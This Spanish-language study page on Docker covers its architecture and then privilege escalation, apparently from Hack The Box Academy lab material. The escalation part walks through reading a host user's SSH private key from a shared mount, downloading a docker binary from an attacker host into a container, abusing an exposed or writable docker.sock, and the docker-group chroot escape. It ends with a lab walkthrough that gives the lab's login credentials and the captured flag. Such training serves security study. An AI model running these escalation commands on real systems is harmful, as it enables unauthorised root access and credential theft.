
# Docker

Docker es una herramienta de código abierto muy popular que ofrece un entorno de ejecución portátil y consistente para aplicaciones de software. Utiliza contenedores como entornos aislados en el espacio de usuario que se ejecutan a nivel del sistema operativo y comparten el sistema de archivos y los recursos del sistema. Una ventaja es que la contenedorización consume significativamente menos recursos que un servidor tradicional o una máquina virtual.&#x20;

La característica principal de Docker es que las aplicaciones se encapsulan en los denominados contenedores Docker. Por lo tanto, se pueden utilizar para cualquier sistema operativo. Un contenedor Docker representa un paquete de software ejecutable autónomo y liviano que contiene todo lo necesario para ejecutar el código de una aplicación en tiempo de ejecución.

***

## <mark style="color:purple;">Arquitectura Docker</mark>

En el núcleo de la arquitectura de Docker se encuentra un modelo cliente-servidor, donde tenemos dos componentes principales:

* `El daemon Docker`
* `El cliente Docker`

El cliente Docker actúa como nuestra interfaz para emitir comandos e interactuar con el ecosistema Docker, mientras que el demonio Docker es responsable de ejecutar esos comandos y administrar los contenedores.

### **Daemon Docker**

El `Docker Daemon`, también conocido como servidor Docker, es una parte fundamental de la plataforma Docker que desempeña un papel fundamental en la gestión y la orquestación de contenedores. Piense en el Docker Daemon como el motor detrás de Docker. Tiene varias responsabilidades esenciales como:

* Ejecutar contenedores Docker
* Interactuar con contenedores Docker

Aadministrar contenedores Docker en el sistema host.

#### **1. Gestión de contenedores Docker**

En primer lugar, se encarga de la funcionalidad básica de contenedorización. Coordina la creación, ejecución y supervisión de los contenedores Docker, manteniendo su aislamiento del host y de otros contenedores. Este aislamiento garantiza que los contenedores funcionen de forma independiente, con sus propios sistemas de archivos, procesos e interfaces de red. Además, se encarga de la gestión de imágenes de Docker. Extrae imágenes de registros, como [Docker Hub](https://hub.docker.com/) o repositorios privados, y las almacena localmente. Estas imágenes sirven como bloques de construcción para la creación de contenedores.

Además, Docker Daemon ofrece capacidades de monitoreo y registro, por ejemplo:

* Captura registros de contenedores
* Proporciona información sobre las actividades del contenedor, los errores y la información de depuración.

El Daemon también monitorea la utilización de recursos, como CPU, memoria y uso de red, lo que nos permite optimizar el rendimiento del contenedor y solucionar problemas.

#### **2. Red y almacenamiento**

Facilita la creación de redes de contenedores mediante la creación de redes virtuales y la gestión de interfaces de red. Permite que los contenedores se comuniquen entre sí y con el mundo exterior a través de puertos de red, direcciones IP y resolución de DNS. Docker Daemon también desempeña un papel fundamental en la gestión del almacenamiento, ya que maneja volúmenes Docker, que se utilizan para conservar datos más allá de la vida útil de los contenedores y administra la creación, la conexión y la limpieza de volúmenes, lo que permite que los contenedores compartan o almacenen datos de forma independiente.

### **Clientes Docker**

Cuando interactuamos con Docker, emitimos comandos a través de `Docker Client`, que se comunica con el Docker Daemon (a través de un `RESTful API` o un `Unix socket`) y sirve como nuestro principal medio de interacción con Docker. También tenemos la capacidad de crear, iniciar, detener, administrar, eliminar contenedores, buscar y descargar imágenes de Docker. Con estas opciones, podemos extraer imágenes existentes para usarlas como base para nuestros contenedores o crear nuestras imágenes personalizadas utilizando Dockerfiles. Tenemos la flexibilidad de enviar nuestras imágenes a repositorios remotos, lo que facilita la colaboración y el uso compartido dentro de nuestros equipos o con la comunidad en general.

En comparación, el Daemon, por otro lado, lleva a cabo las acciones solicitadas, garantizando que los contenedores se creen, inicien, detengan y eliminen según sea necesario.

Otro cliente para Docker es `Docker Compose`. Es una herramienta que simplifica la orquestación de múltiples contenedores Docker como una única aplicación. Nos permite definir la arquitectura multicontenedor de nuestra aplicación mediante un archivo declarativo `YAML`(`.yaml`/ `.yml`). Con él, podemos especificar los servicios que componen nuestra aplicación, sus dependencias y sus configuraciones. Definimos imágenes de contenedores, variables de entorno, redes, enlaces de volúmenes y otras configuraciones. Docker Compose luego se asegura de que todos los contenedores definidos se inicien e interconecten, creando una pila de aplicaciones cohesiva y escalable.

### **Docker Desktop**

`Docker Desktop` está disponible para sistemas operativos MacOS, Windows y Linux y nos proporciona una interfaz gráfica de usuario fácil de usar que simplifica la gestión de los contenedores y sus componentes. Esto nos permite monitorear el estado de nuestros contenedores, inspeccionar registros y administrar los recursos asignados a Docker. Proporciona una forma intuitiva y visual de interactuar con el ecosistema Docker, haciéndolo accesible para desarrolladores de todos los niveles de experiencia y, además, es compatible con Kubernetes.

***

## <mark style="color:purple;">Imágenes y contenedores de Docker</mark>

Piense en un archivo `Docker image` como un plano o una plantilla para crear contenedores. Encapsula todo lo necesario para ejecutar una aplicación, incluido el código de la aplicación, las dependencias, las bibliotecas y las configuraciones. Una imagen es un paquete autónomo de solo lectura que garantiza la coherencia y la reproducibilidad en diferentes entornos. Podemos crear imágenes utilizando un archivo de texto llamado `Dockerfile`, que define los pasos y las instrucciones para crear la imagen.

Un `Docker container` es una instancia de una imagen de Docker. Es un entorno ligero, aislado y ejecutable que ejecuta aplicaciones. Cuando lanzamos un contenedor, este se crea a partir de una imagen específica y el contenedor hereda todas las propiedades y configuraciones definidas en esa imagen. Cada contenedor opera de forma independiente, con su propio sistema de archivos, procesos e interfaces de red. Este aislamiento garantiza que las aplicaciones dentro de los contenedores permanezcan separadas del sistema host subyacente y de otros contenedores, lo que evita conflictos e interferencias.

Mientras que las `imágenes` son inmutables y de `solo lectura`, los `contenedores` son mutables y `pueden ser modificados` durante el tiempo de ejecución. Podemos interactuar con los contenedores, ejecutar comandos dentro de ellos, monitorear sus registros e incluso realizar cambios en su sistema de archivos o entorno. Sin embargo, las modificaciones realizadas en el sistema de archivos de un contenedor no se conservan a menos que se guarden explícitamente como una nueva imagen o se almacenen en un volumen persistente.

***

## <mark style="color:purple;">Escalada de privilegios de Docker</mark>

Lo que puede pasar es que accedamos a un entorno donde encontraremos usuarios que puedan gestionar contenedores docker. Con esto, podríamos buscar formas de cómo utilizar esos contenedores docker para obtener mayores privilegios en el sistema de destino. Podemos utilizar varias formas y técnicas para escalar nuestros privilegios o escapar del contenedor docker.

### **Directorios compartidos de Docker**

Al utilizar Docker, los directorios compartidos (montajes de volumen) pueden salvar la brecha entre el sistema host y el sistema de archivos del contenedor. Con los directorios compartidos, se puede acceder a directorios o archivos específicos del sistema host dentro del contenedor. Esto es increíblemente útil para conservar datos, compartir código y facilitar la colaboración entre los entornos de desarrollo y los contenedores Docker. Sin embargo, siempre depende de la configuración del entorno y de los objetivos que los administradores quieran alcanzar. Para crear un directorio compartido, se especifica una ruta en el sistema host y una ruta correspondiente dentro del contenedor, lo que crea un vínculo directo entre las dos ubicaciones.

Los directorios compartidos ofrecen varias ventajas, entre ellas, la capacidad de conservar datos más allá de la vida útil de un contenedor, simplificar el uso compartido y el desarrollo de código y permitir la colaboración dentro de los equipos. Es importante tener en cuenta que los directorios compartidos se pueden montar como de solo lectura o de lectura y escritura, según los requisitos específicos del administrador. Cuando se montan como de solo lectura, las modificaciones realizadas dentro del contenedor no afectarán al sistema host, lo que resulta útil cuando se prefiere el acceso de solo lectura para evitar modificaciones accidentales.

Cuando obtenemos acceso al contenedor Docker y lo enumeramos localmente, podríamos encontrar directorios adicionales (no estándar) en el sistema de archivos del contenedor Docker.

```shell-session
root@container:~$ cd /hostsystem/home/cry0l1t3
root@container:/hostsystem/home/cry0l1t3$ ls -l

-rw-------  1 cry0l1t3 cry0l1t3  12559 Jun 30 15:09 .bash_history
-rw-r--r--  1 cry0l1t3 cry0l1t3    220 Jun 30 15:09 .bash_logout
-rw-r--r--  1 cry0l1t3 cry0l1t3   3771 Jun 30 15:09 .bashrc
drwxr-x--- 10 cry0l1t3 cry0l1t3   4096 Jun 30 15:09 .ssh


root@container:/hostsystem/home/cry0l1t3$ cat .ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>
```

A partir de aquí, podríamos copiar el contenido de la clave SSH privada al archivo `cry0l1t3.priv` y usarlo para iniciar sesión como usuario `cry0l1t3`en el sistema host.

```shell-session
afsh4ck@kali$ ssh cry0l1t3@<host IP> -i cry0l1t3.priv
```

### **Docker Sockets**

Un `socket Docker` o socket Docker daemon es un archivo especial que nos permite a nosotros y a los procesos comunicarnos con el demonio Docker. Esta comunicación se produce a través de un socket Unix o de un socket de red, dependiendo de la configuración de nuestra instalación Docker. Actúa como un puente, facilitando la comunicación entre el cliente Docker y el demonio Docker. Cuando emitimos un comando a través de la CLI de Docker, el cliente Docker envía el comando al socket Docker y el demonio Docker, a su vez, procesa el comando y lleva a cabo las acciones solicitadas.

Sin embargo, los sockets de Docker requieren los permisos adecuados para garantizar una comunicación segura y evitar el acceso no autorizado. El acceso al socket de Docker suele estar restringido a usuarios o grupos de usuarios específicos, lo que garantiza que solo las personas de confianza puedan emitir comandos e interactuar con el demonio de Docker. Al exponer el socket de Docker a través de una interfaz de red, podemos administrar de forma remota los hosts de Docker, emitir comandos y controlar los contenedores y otros recursos. Este acceso remoto a la API amplía las posibilidades de las configuraciones distribuidas de Docker y los escenarios de gestión remota. Sin embargo, según la configuración, existen muchas formas de almacenar los procesos o tareas automatizados. Esos archivos pueden contener información muy útil para nosotros que podemos usar para escapar del contenedor de Docker.

```shell-session
htb-student@container:~/app$ ls -al

total 8
drwxr-xr-x 1 htb-student htb-student 4096 Jun 30 15:12 .
drwxr-xr-x 1 root        root        4096 Jun 30 15:12 ..
srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock
```

A partir de aquí, podemos utilizar el `docker` para interactuar con el socket y enumerar qué contenedores Docker ya están en ejecución. Si no está instalado, podemos descargarlo [aquí](https://master.dockerproject.org/linux/x86_64/docker) y subirlo al contenedor Docker.

```shell-session
htb-student@container:/tmp$ wget https://<parrot-os>:443/docker -O docker
htb-student@container:/tmp$ chmod +x docker
htb-student@container:/tmp$ ls -l

-rwxr-xr-x 1 htb-student htb-student 0 Jun 30 15:27 docker


htb-student@container:~/tmp$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED       STATUS           PORTS     NAMES
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago    Up 12 minutes    443/tcp   app
<SNIP>
```

Podemos crear nuestro propio contenedor Docker que asigne el directorio raíz del host (`/`) al directorio `/hostsystem` del contenedor. Con esto, obtendremos acceso completo al sistema host. Por lo tanto, debemos asignar estos directorios en consecuencia y usar la imagen `main_app`.

```shell-session
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
htb-student@container:~/app$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED           STATUS           PORTS     NAMES
7ae3bcc818af     main_app      "/docker-entry.s..."    12 seconds ago    Up 8 seconds     443/tcp   app
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago        Up 17 minutes    443/tcp   app
<SNIP>
```

Ahora, podemos iniciar sesión en el nuevo contenedor Docker privilegiado con el ID `7ae3bcc818af`y navegar hasta `/hostsystem`.

```shell-session
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash


root@7ae3bcc818af:~# cat /hostsystem/root/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>
```

Desde allí, podemos intentar nuevamente obtener la clave SSH privada e iniciar sesión como root o como cualquier otro usuario en el sistema con una clave SSH privada en su carpeta.

### **Grupo Docker**

Para obtener privilegios de root a través de Docker, el usuario con el que iniciamos sesión debe estar en el grupo `docker`. Esto le permite usar y controlar el demonio de Docker.

```shell-session
docker-user@nix02:~$ id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

Como alternativa, Docker puede tener configurado el SUID o estamos en el archivo Sudoers, lo que nos permite ejecutar `docker`como root. Las tres opciones nos permiten trabajar con Docker para aumentar nuestros privilegios.

La mayoría de los hosts tienen una conexión directa a Internet porque es necesario descargar las imágenes y los contenedores base. Sin embargo, muchos hosts pueden estar desconectados de Internet por la noche y fuera del horario laboral por razones de seguridad. Sin embargo, si estos hosts se encuentran en una red por la que, por ejemplo, tiene que pasar un servidor web, aún se puede acceder a ellos.

Para ver qué imágenes existen y a cuáles podemos acceder, podemos utilizar el siguiente comando:

```shell-session
docker-user@nix02:~$ docker image ls

REPOSITORY                           TAG                 IMAGE ID       CREATED         SIZE
ubuntu                               20.04               20fffa419e3a   2 days ago    72.8MB
```

### **Socket Docker escribible**

Un caso que también puede ocurrir es cuando el socket de Docker es escribible. Por lo general, este socket se encuentra en `/var/run/docker.sock`. Sin embargo, la ubicación puede ser comprensiblemente diferente. Porque básicamente, esto solo puede ser escrito por el grupo root o docker. Si actuamos como un usuario, no en uno de estos dos grupos, y el socket de Docker aún tiene los privilegios para ser escribible, entonces aún podemos usar este caso para escalar nuestros privilegios.

```shell-session
docker-user@nix02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

root@ubuntu:~# ls -l

total 68
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Sep 22 11:34 boot
drwxr-xr-x   2 root root  4096 Oct  6  2021 cdrom
drwxr-xr-x  19 root root  3940 Oct 24 13:28 dev
drwxr-xr-x 100 root root  4096 Sep 22 13:27 etc
drwxr-xr-x   3 root root  4096 Sep 22 11:06 home
lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 Oct  6  2021 lost+found
drwxr-xr-x   2 root root  4096 Oct 24 13:28 media
drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt
drwxr-xr-x   2 root root  4096 Apr 23  2020 opt
dr-xr-xr-x 307 root root     0 Oct 24 13:28 proc
drwx------   6 root root  4096 Sep 26 21:11 root
drwxr-xr-x  28 root root   920 Oct 24 13:32 run
lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
drwxr-xr-x   7 root root  4096 Oct  7  2021 snap
drwxr-xr-x   2 root root  4096 Apr 23  2020 srv
dr-xr-xr-x  13 root root     0 Oct 24 13:28 sys
drwxrwxrwt  13 root root  4096 Oct 24 13:44 tmp
drwxr-xr-x  14 root root  4096 Sep 22 11:11 usr
drwxr-xr-x  13 root root  4096 Apr 23  2020 var
```

***

## <mark style="color:purple;">Caso práctico</mark>

```
SSH a 10.129.205.237 (ACADEMY-LLPE-DOCKER)
User "htb-student"
Password "HTB_@cademy_stdnt!"
```

Aumenta los privilegios en el objetivo y obtén el archivo `flag.txt` en el directorio raíz. Envía el contenido como respuesta.

Lo primero que observamos al conectarnos es que el usuario pertenece al grupo docker:

```shell-session
htb-student@ubuntu:~$ id
uid=1001(htb-student) gid=1001(htb-student) groups=1001(htb-student),118(docker)
```

Vamos a ver nlas imágenes de Docker existentes:

```shell-session
htb-student@ubuntu:~$ docker image ls
REPOSITORY   TAG       IMAGE ID       CREATED         SIZE
ubuntu       latest    5a81c4b8502e   16 months ago   77.8MB
```

Vamos a ejecutar este contenedor con permisos elevados de la siguiente manera:

```shell-session
htb-student@ubuntu:~$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt /bin/bash
root@4813f13a8915:/# whoami
root
root@4813f13a8915:/# id
uid=0(root) gid=0(root) groups=0(root)
root@4813f13a8915:/# ls
bin  boot  cdrom  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var
root@4813f13a8915:/# cd root
root@4813f13a8915:~# ls
flag.txt  snap
root@4813f13a8915:~# cat flag.txt
HTB{D0ckEr_Pr1v35c}
```

Buum! Ya somos el usuario root y obtenemos la flag!
